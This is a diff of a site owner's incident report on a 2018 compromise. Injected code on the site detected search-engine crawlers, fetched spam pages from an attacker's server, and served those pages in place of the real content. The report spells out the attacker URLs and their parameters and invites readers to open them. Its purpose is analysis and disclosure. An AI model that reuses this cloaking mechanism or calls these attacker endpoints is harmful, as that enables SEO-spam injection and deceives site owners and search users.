@@ -29,21 +29,21 @@ This page is the detail explanation of security breach for our website on 27/Nov
 
     `http://{url[0]}/data1028.php?d=&g={xxx}&t={yyyy-mm-dd hh:ss}&u={file to patch}&h={website schema}&p=0.0&r={referer}&a={browser-agent}&l={website-language};q=0.9&i={current folder}&j=0&o={execution directory}|{path to root directory}`
     
-    >in our example it's `http://www9001.bestyscomputermall.top/data1028.php?d=&g=9001&t=2018-11-30+02%3A41%3A24&u=%2Frobots.txt&h=http&p=0.0&r=&a=&l=en-US,en;q=0.9&i=/&j=0&o=/run_dir/|/home/testbargain/beta`
+    >in our example it's `http://www9001.bestyscomputermall.top/data1028.php?d=&g=9001&t=2018-11-30+02%3A41%3A24&u=/robots.txt&h=http&p=0.0&r=&a=&l=en-US,en;q=0.9&i=/&j=0&o=/run_dir/|/home/testbargain/beta`
     >> this will result to the content that need to be written into the robots.txt
 
-* the script on each call to the website check if it's search engine crawler or not. if it's, then it will call the data Url and pass the browser agent. in this case the data Url return a full webpage which replace the original content of the webpage.
+* the script on each call to the website check if it's search engine crawler or not (by checking the user agent). if it's, then it will call the data Url and pass the browser agent (which is crawler atm). in this case the data Url return a full webpage content which replace the original content of the hacked website. in this way the website owner will see different content than the crawler.
     >in our example is `http://www9001.bestyscomputermall.top/data1028.php?d=&g=9001&t=2018-11-30+02:41:24&u=/index.php&h=http&p=0.0&r=&a=Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&l=en-US,en;q=0.9&i=/&j=0&o=/run_dir/|/home/testbargain/beta` 
     >>the result of last call return some japanese website (as later it turned out it's a chinese company/person that is promoting japanese content atm)
 
     >>you can try the url in your browser
 
-* the return result contains many `<a>` tag with href with empty host and to a imaginary Url like "http:////wagon.html". on next call when the crawler try to call the next page which in our example is `wagon.html` it will hijack the call and return another page related to the `wagon.html`.
+* the return result contains many `<a>` tag with href with empty host and to a imaginary Url like "http:////wagon.html". on next call when the crawler try to crawl the next page which in our example is `wagon.html` it will hijack the call again and return another page related to the `wagon.html`. please note that in each request the script is passing the address of requested Url with query params "u", which is changing when crawler asking for another page.
 
-    >in our example the call is `http://www9001.bestyscomputermall.top/data1028.php?d=&g=9001&t=2018-11-30+02:41:24&u=/wago.html&h=http&p=0.0&r=&a=Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&l=en-US,en;q=0.9&i=/&j=0&o=/run_dir/|/home/testbargain/beta`
+    >in our example the call is `http://www9001.bestyscomputermall.top/data1028.php?d=&g=9001&t=2018-11-30+02:41:24&u=/wagon.html&h=http&p=0.0&r=&a=Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)&l=en-US,en;q=0.9&i=/&j=0&o=/run_dir/|/home/testbargain/beta`
     >>you can try this url in your browser
 
-* the index script on each call also check if the request is coming from yahoo.co.jp, google.jp and Bing. if the condition is true, the script will call the jump url and ask for some content. the content will be added to the actual website content in our example the Url is.
+* the index script on each call also check if the request is reffered from yahoo.co.jp, google.jp and Bing. if the condition is true, the script will call the jump url (which available in the postman) and ask for some content. the content will be added to the hacked website content and like before will not hijack the full website. it's for the case when another user other than the owner of the site search for the hijacked content in the search engine and click on the url to come to visit the website. only in this case the hacker will show his desired link at the top of the page.
 
 * a small script has written to extract all the possible Url which belong to the hacker from the `opensite.ltd`. 
 
@@ -76,6 +76,7 @@ This page is the detail explanation of security breach for our website on 27/Nov
 
 
 the hacker with confident on the obfuscated code and complicated mechanism of their code trusted to expose their identity through the URLs. since there wasn't any automatic decompiler for the used obfuscation method hence a great manual effort has done to reverse engineer the algorithm.
+
 
 detail information and logs and codes are available upon request.
 
